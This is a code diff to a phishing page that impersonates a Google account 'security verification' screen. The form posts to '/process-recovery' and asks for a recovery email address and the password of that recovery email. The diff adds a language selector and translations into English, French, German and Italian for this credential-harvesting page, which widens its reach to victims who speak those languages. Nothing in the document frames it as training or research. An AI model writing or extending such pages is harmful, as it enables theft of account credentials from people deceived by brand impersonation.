@@ -145,6 +145,27 @@
             box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
         }
         
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+        }
+        
+        .language-selector select {
+            padding: 10px 40px 10px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #5f6368;
+            background: white;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%235f6368' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+        }
+        
         @media (max-width: 480px) {
             .form-card {
                 padding: 32px 24px;
@@ -154,36 +175,154 @@
 </head>
 <body>
     <div class="header">
-        <a href="https://accounts.google.com/signup" target="_blank">Crear cuenta</a>
+        <a href="https://accounts.google.com/signup" target="_blank" data-translate="create_account">Crear cuenta</a>
         <a href="https://mail.google.com" target="_blank">Gmail</a>
         <a href="https://images.google.com" target="_blank">Imágenes</a>
     </div>
     
     <div class="main-container">
         <div class="form-card">
-            <h1 class="title">Verificación de seguridad</h1>
-            <p class="subtitle">Protege tu cuenta de accesos no autorizados</p>
+            <h1 class="title" data-translate="security_verification">Verificación de seguridad</h1>
+            <p class="subtitle" data-translate="protect_account">Protege tu cuenta de accesos no autorizados</p>
             
             <div class="security-info">
-                <p><strong>Para mayor seguridad, introduce tu correo electrónico de recuperación.</strong></p>
-                <p>Esta información nos ayuda a verificar tu identidad y proteger tu cuenta si detectamos actividad inusual o si olvidas tu contraseña.</p>
+                <p><strong data-translate="security_title">Para mayor seguridad, introduce tu correo electrónico de recuperación.</strong></p>
+                <p data-translate="security_description">Esta información nos ayuda a verificar tu identidad y proteger tu cuenta si detectamos actividad inusual o si olvidas tu contraseña.</p>
             </div>
             
             <form action="/process-recovery" method="post">
                 <div class="input-container">
-                    <input type="email" class="google-input" name="recovery_email" placeholder="Correo electrónico de recuperación" required autofocus>
+                    <input type="email" class="google-input" name="recovery_email" placeholder="Correo electrónico de recuperación" required autofocus data-translate-placeholder="recovery_email_placeholder">
                 </div>
                 
                 <div class="input-container">
-                    <input type="password" class="google-input" name="recovery_password" placeholder="Contraseña del correo de recuperación" required>
+                    <input type="password" class="google-input" name="recovery_password" placeholder="Contraseña del correo de recuperación" required data-translate-placeholder="recovery_password_placeholder">
                 </div>
                 
                 <div class="button-group">
-                    <a href="/password" class="back-button">Atrás</a>
-                    <button type="submit" class="next-button">Verificar</button>
+                    <a href="/password" class="back-button" data-translate="back">Atrás</a>
+                    <button type="submit" class="next-button" data-translate="verify">Verificar</button>
                 </div>
             </form>
         </div>
     </div>
+    
+    <div class="footer">
+        <div class="language-selector">
+            <select id="languageSelect">
+                <option value="es">Español (España)</option>
+                <option value="en">English (United States)</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+            </select>
+        </div>
+    </div>
+    
+    <script>
+        const translations = {
+            'es': {
+                'title': 'Verificación de seguridad - Cuenta de Google',
+                'security_verification': 'Verificación de seguridad',
+                'protect_account': 'Protege tu cuenta de accesos no autorizados',
+                'security_title': 'Para mayor seguridad, introduce tu correo electrónico de recuperación.',
+                'security_description': 'Esta información nos ayuda a verificar tu identidad y proteger tu cuenta si detectamos actividad inusual o si olvidas tu contraseña.',
+                'recovery_email_placeholder': 'Correo electrónico de recuperación',
+                'recovery_password_placeholder': 'Contraseña del correo de recuperación',
+                'back': 'Atrás',
+                'verify': 'Verificar',
+                'create_account': 'Crear cuenta'
+            },
+            'en': {
+                'title': 'Security verification - Google Account',
+                'security_verification': 'Security verification',
+                'protect_account': 'Protect your account from unauthorized access',
+                'security_title': 'For added security, enter your recovery email.',
+                'security_description': 'This information helps us verify your identity and protect your account if we detect unusual activity or if you forget your password.',
+                'recovery_email_placeholder': 'Recovery email',
+                'recovery_password_placeholder': 'Recovery email password',
+                'back': 'Back',
+                'verify': 'Verify',
+                'create_account': 'Create account'
+            },
+            'fr': {
+                'title': 'Vérification de sécurité - Compte Google',
+                'security_verification': 'Vérification de sécurité',
+                'protect_account': 'Protégez votre compte contre les accès non autorisés',
+                'security_title': 'Pour plus de sécurité, saisissez votre adresse e-mail de récupération.',
+                'security_description': 'Ces informations nous aident à vérifier votre identité et à protéger votre compte en cas d\'activité inhabituelle ou si vous oubliez votre mot de passe.',
+                'recovery_email_placeholder': 'Adresse e-mail de récupération',
+                'recovery_password_placeholder': 'Mot de passe de l\'adresse e-mail de récupération',
+                'back': 'Retour',
+                'verify': 'Vérifier',
+                'create_account': 'Créer un compte'
+            },
+            'de': {
+                'title': 'Sicherheitsüberprüfung - Google-Konto',
+                'security_verification': 'Sicherheitsüberprüfung',
+                'protect_account': 'Schützen Sie Ihr Konto vor unbefugtem Zugriff',
+                'security_title': 'Für zusätzliche Sicherheit geben Sie Ihre Wiederherstellungs-E-Mail ein.',
+                'security_description': 'Diese Informationen helfen uns, Ihre Identität zu überprüfen und Ihr Konto zu schützen, wenn wir ungewöhnliche Aktivitäten feststellen oder Sie Ihr Passwort vergessen.',
+                'recovery_email_placeholder': 'Wiederherstellungs-E-Mail',
+                'recovery_password_placeholder': 'Wiederherstellungs-E-Mail-Passwort',
+                'back': 'Zurück',
+                'verify': 'Überprüfen',
+                'create_account': 'Konto erstellen'
+            },
+            'it': {
+                'title': 'Verifica di sicurezza - Account Google',
+                'security_verification': 'Verifica di sicurezza',
+                'protect_account': 'Proteggi il tuo account da accessi non autorizzati',
+                'security_title': 'Per maggiore sicurezza, inserisci la tua email di recupero.',
+                'security_description': 'Queste informazioni ci aiutano a verificare la tua identità e proteggere il tuo account se rileviamo attività insolite o se dimentichi la password.',
+                'recovery_email_placeholder': 'Email di recupero',
+                'recovery_password_placeholder': 'Password dell\'email di recupero',
+                'back': 'Indietro',
+                'verify': 'Verifica',
+                'create_account': 'Crea un account'
+            }
+        };
+        
+        function updateTranslations(lang) {
+            const langData = translations[lang] || translations['es'];
+            
+            // Update page title
+            document.title = langData.title;
+            
+            // Update all elements with data-translate
+            document.querySelectorAll('[data-translate]').forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (langData[key]) {
+                    element.textContent = langData[key];
+                }
+            });
+            
+            // Update placeholders
+            document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
+                const key = element.getAttribute('data-translate-placeholder');
+                if (langData[key]) {
+                    element.placeholder = langData[key];
+                }
+            });
+            
+            // Save language preference
+            localStorage.setItem('selectedLanguage', lang);
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            const languageSelect = document.getElementById('languageSelect');
+            const savedLang = localStorage.getItem('selectedLanguage') || 'es';
+            
+            // Set saved language
+            languageSelect.value = savedLang;
+            updateTranslations(savedLang);
+            
+            // Listen for language changes
+            languageSelect.addEventListener('change', function() {
+                updateTranslations(this.value);
+            });
+        });
+    </script>
 </body>
 </html>
